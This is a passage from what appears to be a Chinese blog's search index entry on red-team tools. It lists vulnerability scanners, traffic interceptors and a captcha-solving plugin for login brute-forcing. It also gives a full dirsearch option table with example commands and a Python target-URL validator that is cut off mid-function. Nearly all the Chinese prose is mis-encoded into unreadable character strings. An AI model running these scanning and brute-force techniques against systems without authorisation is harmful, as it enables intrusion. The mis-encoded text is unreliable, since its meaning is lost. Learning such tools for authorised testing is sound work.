<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>çº¢é˜Ÿå·¥å…·</title>
    <url>/RedTeamTools.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="å·¥å…·ç»Ÿè®¡"><a href="#å·¥å…·ç»Ÿè®¡" class="headerlink" title="å·¥å…·ç»Ÿè®¡"></a>å·¥å…·ç»Ÿè®¡</h1><h2 id="Vulnerability-Scan"><a href="#Vulnerability-Scan" class="headerlink" title="Vulnerability Scan"></a>Vulnerability Scan</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>nuclei</td>
<td>åŸºäºyamlæ ¼å¼çš„POCæ¼æ‰«å·¥å…·ï¼ˆå‘½ä»¤è¡Œå½¢å¼ï¼‰</td>
</tr>
<tr>
<td>nuclei-web</td>
<td>å°‘æ¬£è‡ªç ”çš„åŸºäºnuclei+fofaçš„æ¼æ‰«å¹³å°</td>
</tr>
<tr>
<td>AWVS</td>
<td>å›½å¤–çš„æ¼æ‰«å¹³å°ï¼Œå»ºè®®åœ¨é—²é±¼ä¸Šè´­ä¹°å½“å¹´æœ€æ–°çš„ç‰ˆæœ¬</td>
</tr>
</tbody></table>
<h2 id="Package-Sniffing"><a href="#Package-Sniffing" class="headerlink" title="Package Sniffing"></a>Package Sniffing</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>BurpSuite</td>
<td>ç»å…¸HTTP&#x2F;sæŠ“åŒ…å·¥å…·ï¼Œæ’ä»¶ç”Ÿæ€ä¸°å¯Œ</td>
</tr>
<tr>
<td>Wireshark</td>
<td>æŠ“å»æ•´ä¸ªç½‘å¡æµé‡çš„è€ç‰Œå·¥å…·</td>
</tr>
<tr>
<td>Proxifier</td>
<td>ä»£ç†æŒ‡å®šè¿›ç¨‹çš„æ‰€æœ‰æµé‡</td>
</tr>
<tr>
<td>Yakit</td>
<td>å›½äº§http&#x2F;sæŠ“åŒ…å·¥å…·ï¼Œæ–°èµ·ä¹‹ç§€ï¼Œç­‰å‡ å¹´æ’ä»¶ç”Ÿæ€ä¸°å¯Œäº†å†ç”¨</td>
</tr>
<tr>
<td>captcha-killer</td>
<td>BurpSuiteæ’ä»¶ï¼šçˆ†ç ´ç™»å½•æ¡†æ—¶ï¼Œè‡ªåŠ¨è¯†åˆ«éªŒè¯ç </td>
</tr>
<tr>
<td>HaE</td>
<td>æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼åœ¨è¯·æ±‚æˆ–è€…å“åº”ä¸­åŒ¹é…å…³é”®å­—ï¼Œç„¶åé«˜äº®æ˜¾ç¤ºï¼Œæ£€æµ‹ä¿¡æ¯æ³„éœ²éå¸¸å¥½ç”¨</td>
</tr>
</tbody></table>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>010Editor</td>
<td>16è¿›åˆ¶æŸ¥çœ‹å·¥å…·</td>
</tr>
<tr>
<td>jadx-gui</td>
<td>apk&#x2F;jaré™æ€åˆ†æã€åç¼–è¯‘å·¥å…·</td>
</tr>
</tbody></table>
<h2 id="All-in"><a href="#All-in" class="headerlink" title="All-in"></a>All-in</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Tscan</td>
<td>èšåˆäº†ç«¯å£æ‰«æã€pocæ‰«æã€çº¢é˜Ÿå¸¸ç”¨å°å·¥å…·çš„GUIç¨‹åºï¼ŒåŸºäºJAVAå®ç°è·¨å¹³å°</td>
</tr>
</tbody></table>
<h2 id="ObtainInfo"><a href="#ObtainInfo" class="headerlink" title="ObtainInfo"></a>ObtainInfo</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>observer_ward</td>
<td>Web finger scanner</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h1><h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><ol>
<li><p>windowså¹³å°ä¸Šï¼ŒåŒå‡»å¯åŠ¨æˆ–è€…é€šè¿‡è‡ªå·±å†™çš„bat&#x2F;vbså¯åŠ¨å™¨è¿è¡Œxray.exeï¼Œä¼šå‡ºä¸‹ä¸‹é¢çš„æŠ¥é”™ï¼ˆno command providedï¼‰ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111101623009.png" alt="image-20251111101623009"></p>
</li>
<li><p>è§£å†³æ–¹æ³•</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. æ‰‹å·¥æ‰“å¼€CMDï¼Œç„¶åè¿›å…¥åˆ°xray.exeæ‰€åœ¨çš„ç›®å½•ï¼Œå†æ‰§è¡Œxrayç›¸å…³å‘½ä»¤ï¼ˆæ¨èï¼‰</span><br><span class="line">2. å¦‚æœè¯´ä½ æ¯æ¬¡æ‰“å¼€CMDï¼Œéƒ½åœ¨XXç›®å½•ï¼Œé‚£ä¹ˆå°†xrayæ‰€åœ¨çš„ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨æ”¾åˆ°XXç›®å½•ä¸­ï¼ˆæ³¨æ„ï¼Œæ˜¯æ‰€æœ‰å†…å®¹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–‡ä»¶å¤¹ï¼‰ï¼Œæœ€ç»ˆå°†XXç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­å³å¯ï¼ˆä¸æ¨èï¼‰</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="å…·ä½“ä½¿ç”¨"><a href="#å…·ä½“ä½¿ç”¨" class="headerlink" title="å…·ä½“ä½¿ç”¨"></a>å…·ä½“ä½¿ç”¨</h1><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><table>
<thead>
<tr>
<th>å‘½ä»¤å‚æ•°</th>
<th>è§£é‡Šï¼ˆä¸­æ–‡ï¼‰</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>--version</code></td>
<td>æ˜¾ç¤ºç¨‹åºç‰ˆæœ¬å·å¹¶é€€å‡º</td>
<td><code>python dirsearch.py --version</code></td>
</tr>
<tr>
<td><code>-h, --help</code></td>
<td>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</td>
<td><code>python dirsearch.py -h</code></td>
</tr>
<tr>
<td><code>-u URL, --url=URL</code></td>
<td>æŒ‡å®šç›®æ ‡ URLï¼Œå¯å¤šæ¬¡ä½¿ç”¨æŒ‡å®šå¤šä¸ª URL</td>
<td><code>python dirsearch.py -u http://example.com</code></td>
</tr>
<tr>
<td><code>-l PATH, --url-file=PATH</code></td>
<td>æŒ‡å®šåŒ…å«å¤šä¸ª URL çš„åˆ—è¡¨æ–‡ä»¶</td>
<td><code>python dirsearch.py -l urls.txt</code></td>
</tr>
<tr>
<td><code>--stdin</code></td>
<td>ä»æ ‡å‡†è¾“å…¥è¯»å– URL</td>
<td><code>python dirsearch.py --stdin &lt;&lt; cat urls.txt</code></td>
</tr>
<tr>
<td><code>--cidr=CIDR</code></td>
<td>å¯¹æŒ‡å®š CIDR ç½‘æ®µå†…çš„æ‰€æœ‰ IP è¿›è¡Œæ‰«æ</td>
<td><code>python dirsearch.py --cidr 192.168.1.0/24</code></td>
</tr>
<tr>
<td><code>--raw=PATH</code></td>
<td>ä»æ–‡ä»¶åŠ è½½åŸå§‹ HTTP è¯·æ±‚ï¼Œéœ€é…åˆ<code>--scheme</code>è®¾ç½®åè®®</td>
<td><code>python dirsearch.py --raw request.txt --scheme http</code></td>
</tr>
<tr>
<td><code>-s SESSION_FILE, --session=SESSION_FILE</code></td>
<td>æŒ‡å®šä¼šè¯æ–‡ä»¶ï¼Œç”¨äºä¿å­˜æˆ–åŠ è½½æ‰«æä¼šè¯ä»¥ç»­æ‰«</td>
<td><code>python dirsearch.py -u http://example.com -s scan.session</code></td>
</tr>
<tr>
<td><code>--config=PATH</code></td>
<td>æŒ‡å®šé…ç½®æ–‡ä»¶å®Œæ•´è·¯å¾„ï¼Œé»˜è®¤<code>config.ini</code></td>
<td><code>python dirsearch.py --config my_config.ini -u http://example.com</code></td>
</tr>
<tr>
<td><code>-w WORDLISTS, --wordlists=WORDLISTS</code></td>
<td>è‡ªå®šä¹‰å­—å…¸ï¼Œå¤šä¸ªå­—å…¸ç”¨é€—å·åˆ†éš”</td>
<td><code>python dirsearch.py -u http://example.com -w dict1.txt,dict2.txt</code></td>
</tr>
<tr>
<td><code>-e EXTENSIONS, --extensions=EXTENSIONS</code></td>
<td>æŒ‡å®šæ–‡ä»¶æ‰©å±•ååˆ—è¡¨ï¼Œç”¨é€—å·åˆ†éš”</td>
<td><code>python dirsearch.py -u http://example.com -e php,html,js</code></td>
</tr>
<tr>
<td><code>-f, --force-extensions</code></td>
<td>å¼ºåˆ¶åœ¨æ¯ä¸ªå­—å…¸æ¡ç›®åæ·»åŠ æ‰©å±•å</td>
<td><code>python dirsearch.py -u http://example.com -e php -f</code></td>
</tr>
<tr>
<td><code>-O, --overwrite-extensions</code></td>
<td>ç”¨æŒ‡å®šæ‰©å±•åè¦†ç›–å­—å…¸ä¸­å·²æœ‰æ‰©å±•å</td>
<td><code>python dirsearch.py -u http://example.com -e php -O -w dict.txt</code></td>
</tr>
<tr>
<td><code>--exclude-extensions=EXTENSIONS</code></td>
<td>æ’é™¤æŒ‡å®šæ‰©å±•ååˆ—è¡¨ï¼Œç”¨é€—å·åˆ†éš”</td>
<td><code>python dirsearch.py -u http://example.com --exclude-extensions asp,jsp</code></td>
</tr>
<tr>
<td><code>--remove-extensions</code></td>
<td>ç§»é™¤æ‰€æœ‰è·¯å¾„ä¸­çš„æ‰©å±•å</td>
<td><code>python dirsearch.py -u http://example.com --remove-extensions</code></td>
</tr>
<tr>
<td><code>--prefixes=PREFIXES</code></td>
<td>ä¸ºæ‰€æœ‰å­—å…¸æ¡ç›®æ·»åŠ è‡ªå®šä¹‰å‰ç¼€ï¼Œç”¨é€—å·åˆ†éš”</td>
<td><code>python dirsearch.py -u http://example.com --prefixes /api,/v1 -w dict.txt</code></td>
</tr>
<tr>
<td><code>--suffixes=SUFFIXES</code></td>
<td>ä¸ºæ‰€æœ‰å­—å…¸æ¡ç›®æ·»åŠ è‡ªå®šä¹‰åç¼€ï¼ˆå¿½ç•¥ç›®å½•ï¼‰ï¼Œç”¨é€—å·åˆ†éš”</td>
<td><code>python dirsearch.py -u http://example.com --suffixes .bak,.old -w dict.txt</code></td>
</tr>
<tr>
<td><code>-U, --uppercase</code></td>
<td>å°†å­—å…¸å†…å®¹è½¬ä¸ºå¤§å†™</td>
<td><code>python dirsearch.py -u http://example.com -U -w dict.txt</code></td>
</tr>
<tr>
<td><code>-L, --lowercase</code></td>
<td>å°†å­—å…¸å†…å®¹è½¬ä¸ºå°å†™</td>
<td><code>python dirsearch.py -u http://example.com -L -w dict.txt</code></td>
</tr>
<tr>
<td><code>-C, --capital</code></td>
<td>å°†å­—å…¸å†…å®¹æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™</td>
<td><code>python dirsearch.py -u http://example.com -C -w dict.txt</code></td>
</tr>
<tr>
<td><code>-t THREADS, --threads=THREADS</code></td>
<td>æŒ‡å®šçº¿ç¨‹æ•°</td>
<td><code>python dirsearch.py -u http://example.com -t 50</code></td>
</tr>
<tr>
<td><code>-r, --recursive</code></td>
<td>é€’å½’æš´åŠ›æ‰«æå­ç›®å½•</td>
<td><code>python dirsearch.py -u http://example.com -r</code></td>
</tr>
<tr>
<td><code>--deep-recursive</code></td>
<td>å¯¹æ¯ä¸ªç›®å½•å±‚çº§æ‰§è¡Œé€’å½’æ‰«æ</td>
<td><code>python dirsearch.py -u http://example.com --deep-recursive</code></td>
</tr>
<tr>
<td><code>--force-recursive</code></td>
<td>å¯¹æ‰€æœ‰æ‰¾åˆ°çš„è·¯å¾„æ‰§è¡Œé€’å½’æš´åŠ›æ‰«æï¼ˆä¸é™äºç›®å½•ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --force-recursive</code></td>
</tr>
<tr>
<td><code>-R DEPTH, --max-recursion-depth=DEPTH</code></td>
<td>æŒ‡å®šæœ€å¤§é€’å½’æ·±åº¦</td>
<td><code>python dirsearch.py -u http://example.com -r -R 2</code></td>
</tr>
<tr>
<td><code>--recursion-status=CODES</code></td>
<td>æŒ‡å®šè§¦å‘é€’å½’æ‰«æçš„æœ‰æ•ˆçŠ¶æ€ç ï¼ˆæ”¯æŒèŒƒå›´ï¼Œé€—å·åˆ†éš”ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com -r --recursion-status 200,301-302</code></td>
</tr>
<tr>
<td><code>--subdirs=SUBDIRS</code></td>
<td>æ‰«ææŒ‡å®š URL çš„å­ç›®å½•ï¼ˆé€—å·åˆ†éš”ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --subdirs /admin,/blog</code></td>
</tr>
<tr>
<td><code>--exclude-subdirs=SUBDIRS</code></td>
<td>é€’å½’æ‰«ææ—¶æ’é™¤æŒ‡å®šå­ç›®å½•ï¼ˆé€—å·åˆ†éš”ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com -r --exclude-subdirs /tmp,/log</code></td>
</tr>
<tr>
<td><code>-i CODES, --include-status=CODES</code></td>
<td>æŒ‡å®šåŒ…å«çš„çŠ¶æ€ç ï¼ˆæ”¯æŒèŒƒå›´ï¼Œé€—å·åˆ†éš”ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com -i 200,301-302</code></td>
</tr>
<tr>
<td><code>-x CODES, --exclude-status=CODES</code></td>
<td>æŒ‡å®šæ’é™¤çš„çŠ¶æ€ç ï¼ˆæ”¯æŒèŒƒå›´ï¼Œé€—å·åˆ†éš”ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com -x 404,403</code></td>
</tr>
<tr>
<td><code>--exclude-sizes=SIZES</code></td>
<td>æŒ‰å“åº”å¤§å°æ’é™¤ç»“æœï¼ˆé€—å·åˆ†éš”ï¼Œå¦‚ 0B,4KBï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --exclude-sizes 0B,4KB</code></td>
</tr>
<tr>
<td><code>--exclude-text=TEXTS</code></td>
<td>æŒ‰å“åº”å†…å®¹ä¸­çš„æ–‡æœ¬æ’é™¤ç»“æœï¼Œå¯å¤šæ¬¡ä½¿ç”¨</td>
<td><code>python dirsearch.py -u http://example.com --exclude-text &quot;Not Found&quot; --exclude-text &quot;Error&quot;</code></td>
</tr>
<tr>
<td><code>--exclude-regex=REGEX</code></td>
<td>æŒ‰æ­£åˆ™è¡¨è¾¾å¼æ’é™¤å“åº”ç»“æœ</td>
<td><code>python dirsearch.py -u http://example.com --exclude-regex &quot;404.*Not Found&quot;</code></td>
</tr>
<tr>
<td><code>--exclude-redirect=STRING</code></td>
<td>è‹¥é‡å®šå‘ URL åŒ¹é…æŒ‡å®šæ­£åˆ™æˆ–æ–‡æœ¬åˆ™æ’é™¤è¯¥å“åº”</td>
<td><code>python dirsearch.py -u http://example.com --exclude-redirect &#39;/index.html&#39;</code></td>
</tr>
<tr>
<td><code>--exclude-response=PATH</code></td>
<td>æ’é™¤ä¸æŒ‡å®šé¡µé¢å“åº”ç›¸ä¼¼çš„ç»“æœ</td>
<td><code>python dirsearch.py -u http://example.com --exclude-response 404.html</code></td>
</tr>
<tr>
<td><code>--skip-on-status=CODES</code></td>
<td>é‡åˆ°æŒ‡å®šçŠ¶æ€ç æ—¶è·³è¿‡å½“å‰ç›®æ ‡ï¼ˆæ”¯æŒèŒƒå›´ï¼Œé€—å·åˆ†éš”ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --skip-on-status 500-503</code></td>
</tr>
<tr>
<td><code>--min-response-size=LENGTH</code></td>
<td>ä»…ä¿ç•™å“åº”é•¿åº¦å¤§äºè¯¥å€¼çš„ç»“æœ</td>
<td><code>python dirsearch.py -u http://example.com --min-response-size 100</code></td>
</tr>
<tr>
<td><code>--max-response-size=LENGTH</code></td>
<td>ä»…ä¿ç•™å“åº”é•¿åº¦å°äºè¯¥å€¼çš„ç»“æœ</td>
<td><code>python dirsearch.py -u http://example.com --max-response-size 10000</code></td>
</tr>
<tr>
<td><code>--max-time=SECONDS</code></td>
<td>æŒ‡å®šæ‰«æçš„æœ€å¤§è¿è¡Œæ—¶é—´ï¼ˆç§’ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --max-time 300</code></td>
</tr>
<tr>
<td><code>--exit-on-error</code></td>
<td>é‡åˆ°é”™è¯¯æ—¶ç«‹å³é€€å‡ºæ‰«æ</td>
<td><code>python dirsearch.py -u http://example.com --exit-on-error</code></td>
</tr>
<tr>
<td><code>-m METHOD, --http-method=METHOD</code></td>
<td>æŒ‡å®š HTTP è¯·æ±‚æ–¹æ³•ï¼Œé»˜è®¤ GET</td>
<td><code>python dirsearch.py -u http://example.com -m POST</code></td>
</tr>
<tr>
<td><code>-d DATA, --data=DATA</code></td>
<td>æŒ‡å®š HTTP è¯·æ±‚æ•°æ®ï¼ˆç”¨äº POST ç­‰æ–¹æ³•ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com -m POST -d &quot;username=test&amp;password=123&quot;</code></td>
</tr>
<tr>
<td><code>--data-file=PATH</code></td>
<td>æŒ‡å®šåŒ…å« HTTP è¯·æ±‚æ•°æ®çš„æ–‡ä»¶</td>
<td><code>python dirsearch.py -u http://example.com -m POST --data-file data.txt</code></td>
</tr>
<tr>
<td><code>-H HEADERS, --header=HEADERS</code></td>
<td>æŒ‡å®š HTTP è¯·æ±‚å¤´ï¼Œå¯å¤šæ¬¡ä½¿ç”¨</td>
<td><code>python dirsearch.py -u http://example.com -H &quot;Authorization: Bearer token&quot; -H &quot;X-Custom: value&quot;</code></td>
</tr>
<tr>
<td><code>--header-file=PATH</code></td>
<td>æŒ‡å®šåŒ…å« HTTP è¯·æ±‚å¤´çš„æ–‡ä»¶</td>
<td><code>python dirsearch.py -u http://example.com --header-file headers.txt</code></td>
</tr>
<tr>
<td><code>-F, --follow-redirects</code></td>
<td>è·Ÿéš HTTP é‡å®šå‘</td>
<td><code>python dirsearch.py -u http://example.com -F</code></td>
</tr>
<tr>
<td><code>--random-agent</code></td>
<td>ä¸ºæ¯ä¸ªè¯·æ±‚é€‰æ‹©éšæœº User-Agent</td>
<td><code>python dirsearch.py -u http://example.com --random-agent</code></td>
</tr>
<tr>
<td><code>--auth=CREDENTIAL</code></td>
<td>æŒ‡å®šè®¤è¯å‡­æ®ï¼ˆå¦‚ç”¨æˆ·åï¼šå¯†ç æˆ– Bearer ä»¤ç‰Œï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --auth &quot;admin:123456&quot;</code> æˆ– <code>--auth &quot;Bearer abc123&quot;</code></td>
</tr>
<tr>
<td><code>--auth-type=TYPE</code></td>
<td>æŒ‡å®šè®¤è¯ç±»å‹ï¼ˆbasicã€digestã€bearer ç­‰ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --auth &quot;admin:123456&quot; --auth-type basic</code></td>
</tr>
<tr>
<td><code>--cert-file=PATH</code></td>
<td>æŒ‡å®šåŒ…å«å®¢æˆ·ç«¯è¯ä¹¦çš„æ–‡ä»¶</td>
<td><code>python dirsearch.py -u https://example.com --cert-file client.crt</code></td>
</tr>
<tr>
<td><code>--key-file=PATH</code></td>
<td>æŒ‡å®šåŒ…å«å®¢æˆ·ç«¯è¯ä¹¦ç§é’¥çš„æ–‡ä»¶ï¼ˆæœªåŠ å¯†ï¼‰</td>
<td><code>python dirsearch.py -u https://example.com --cert-file client.crt --key-file client.key</code></td>
</tr>
<tr>
<td><code>--user-agent=USER_AGENT</code></td>
<td>æŒ‡å®šè‡ªå®šä¹‰ User-Agent</td>
<td><code>python dirsearch.py -u http://example.com --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0&quot;</code></td>
</tr>
<tr>
<td><code>--cookie=COOKIE</code></td>
<td>æŒ‡å®š HTTP Cookie</td>
<td><code>python dirsearch.py -u http://example.com --cookie &quot;PHPSESSID=abc123; username=admin&quot;</code></td>
</tr>
<tr>
<td><code>--timeout=TIMEOUT</code></td>
<td>æŒ‡å®šè¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --timeout 5</code></td>
</tr>
<tr>
<td><code>--delay=DELAY</code></td>
<td>æŒ‡å®šè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿï¼ˆç§’ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --delay 1</code></td>
</tr>
<tr>
<td><code>--proxy=PROXY</code></td>
<td>æŒ‡å®šä»£ç† URLï¼ˆæ”¯æŒ HTTP&#x2F;SOCKSï¼Œå¯å¤šæ¬¡ä½¿ç”¨ï¼‰</td>
<td><code>python dirsearch.py -u http://example.com --proxy http://127.0.0.1:8080</code></td>
</tr>
<tr>
<td><code>--proxy-file=PATH</code></td>
<td>æŒ‡å®šåŒ…å«ä»£ç†æœåŠ¡å™¨åˆ—è¡¨çš„æ–‡ä»¶</td>
<td><code>python dirsearch.py -u http://example.com --proxy-file proxies.txt</code></td>
</tr>
<tr>
<td><code>--proxy-auth=CREDENTIAL</code></td>
<td>æŒ‡å®šä»£ç†è®¤è¯å‡­æ®</td>
<td><code>python dirsearch.py -u http://example.com --proxy http://127.0.0.1:8080 --proxy-auth &quot;user:pass&quot;</code></td>
</tr>
</tbody></table>
<h3 id="ç›®æ ‡æ ¼å¼"><a href="#ç›®æ ‡æ ¼å¼" class="headerlink" title="ç›®æ ‡æ ¼å¼"></a>ç›®æ ‡æ ¼å¼</h3><ol>
<li><p>æ ¼å¼è¦æ±‚ï¼šåè®®:&#x2F;&#x2F;ä¸»æœº:ç«¯å£</p>
</li>
<li><p>æ ¼å¼å¤„ç†</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_target</span>(<span class="params">raw_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ç¬¬ä¸€æ­¥ï¼šæ ¡éªŒå­—ç¬¦ä¸²æ˜¯å¦ä¸ºåˆæ³•çš„ç›®æ ‡åœ°å€ï¼ˆåŸŸå/IPï¼‰ï¼Œè¿‡æ»¤éåœ°å€å­—ç¬¦</span></span><br><span class="line"><span class="string">    :param raw_str: å¾…æ ¡éªŒçš„åŸå§‹å­—ç¬¦ä¸²ï¼ˆå¦‚&quot;target.com&quot;ã€&quot;192.168.1.100&quot;ã€&quot;abcdefg&quot;ï¼‰</span></span><br><span class="line"><span class="string">    :return: True=åˆæ³•åœ°å€ï¼ŒFalse=éåœ°å€å­—ç¬¦</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. å…ˆç§»é™¤å­—ç¬¦ä¸²å‰åç©ºæ ¼ï¼ˆé¿å…ç”¨æˆ·è¾“å…¥æ—¶çš„è¯¯æ“ä½œï¼‰</span></span><br><span class="line">    raw_str = raw_str.strip()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. æ ¡éªŒæ˜¯å¦ä¸ºIPv4åœ°å€ï¼ˆæ ¼å¼ï¼šxxx.xxx.xxx.xxxï¼Œæ¯ä¸ªæ®µ0-255ï¼‰</span></span><br><span class="line">    ipv4_pattern = <span class="string">r&quot;^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(ipv4_pattern, raw_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. æ ¡éªŒæ˜¯å¦ä¸ºåŸŸåï¼ˆéœ€åŒ…å«â€œ.â€ï¼Œä¸”ç¬¦åˆåŸŸåè§„åˆ™ï¼šå­—æ¯/æ•°å­—/è¿å­—ç¬¦ï¼Œä¸”ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼‰</span></span><br><span class="line">    <span class="comment"># åŸŸåè§„åˆ™ï¼šè‡³å°‘1ä¸ªâ€œ.â€ï¼Œå‰ç¼€/åç¼€ä¸ºå­—æ¯æ•°å­—ï¼Œä¸­é—´å¯å«è¿å­—ç¬¦ï¼ˆå¦‚â€œtarget.comâ€â€œa-b-c.cnâ€â€œapi.v1.target.comâ€ï¼‰</span></span><br><span class="line">    domain_pattern = <span class="string">r&quot;^[a-zA-Z0-9]([a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?)*$&quot;</span></span><br><span class="line">    <span class="comment"># é¢å¤–æ¡ä»¶ï¼šå¿…é¡»åŒ…å«â€œ.â€ï¼ˆæ’é™¤â€œabcdefgâ€è¿™ç±»çº¯å­—ç¬¦ï¼‰ï¼Œä¸”é•¿åº¦ç¬¦åˆåŸŸåè§„èŒƒï¼ˆ1-253å­—ç¬¦ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> raw_str <span class="keyword">and</span> <span class="built_in">len</span>(raw_str) &lt;= <span class="number">253</span> <span class="keyword">and</span> re.<span class="keyword">match</span>(domain_pattern, raw_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. è‹¥åŒ…å«ç«¯å£ï¼ˆå¦‚â€œtarget.com:8080â€â€œ192.168.1.1:443â€ï¼‰ï¼Œæå–åŸŸå/IPåå†æ ¡éªŒ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> raw_str:</span><br><span class="line">        <span class="comment"># åˆ†å‰²â€œåŸŸå/IPâ€ä¸â€œç«¯å£â€ï¼ˆä»…æŒ‰ç¬¬ä¸€ä¸ªâ€œ:â€åˆ†å‰²ï¼Œé¿å…IPv6å¹²æ‰°ï¼Œæ­¤å¤„æš‚ä¸æ”¯æŒIPv6ï¼‰</span></span><br><span class="line">        host_part, port_part = raw_str.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># ç«¯å£éœ€ä¸ºæ•°å­—ï¼ˆ1-65535ï¼‰ï¼Œä¸”ä¸»æœºéƒ¨åˆ†éœ€ç¬¦åˆåŸŸå/IPæ ¼å¼</span></span><br><span class="line">        <span class="keyword">if</span> port_part.isdigit() <span class="keyword">and</span> <span class="number">1</span> &lt;= <span class="built_in">int</span>(port_part) &lt;= <span class="number">65535</span>:</span><br><span class="line">            <span class="keyword">return</span> is_valid_target(host_part)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. éåˆæ³•åœ°å€ï¼ˆå¦‚â€œabcdefgâ€â€œ123456â€â€œtest@target.comâ€ï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_valid_target</span>(<span class="params">raw_url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ç¬¬äºŒæ­¥ï¼šå¯¹åˆæ³•åœ°å€è¿›è¡Œæ ‡å‡†åŒ–æ ¼å¼åŒ–ï¼Œç¬¦åˆdirsearchè¦æ±‚</span></span><br><span class="line"><span class="string">    :param raw_url: åˆæ³•çš„åŸå§‹åœ°å€ï¼ˆå¦‚â€œtarget.comâ€â€œ192.168.1.1:8080â€â€œhttps://target.com/adminâ€ï¼‰</span></span><br><span class="line"><span class="string">    :return: æ ‡å‡†åŒ–åçš„URLï¼ˆå¦‚â€œhttp://target.com:80â€â€œhttp://192.168.1.1:8080â€â€œhttps://target.com:443â€ï¼‰</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. è¡¥å…¨åè®®ï¼ˆæ— åè®®æ—¶é»˜è®¤è¡¥httpï¼Œåç»­å¯æ‰‹åŠ¨è°ƒæ•´ä¸ºhttpsï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^https?://&quot;</span>, raw_url, re.IGNORECASE):</span><br><span class="line">        raw_url = <span class="string">f&quot;http://<span class="subst">&#123;raw_url&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 